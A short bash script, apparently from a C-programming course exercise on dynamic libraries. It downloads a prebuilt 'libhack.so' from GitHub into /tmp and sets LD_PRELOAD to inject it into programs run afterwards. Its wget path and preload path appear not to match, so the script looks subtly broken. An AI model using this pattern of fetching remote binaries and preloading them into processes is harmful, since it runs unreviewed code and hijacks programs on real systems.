#!/bin/bash
wget -P /tmp/libhack.so https://github.com/Agezadebelu/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=.:/tmp/libhack.so
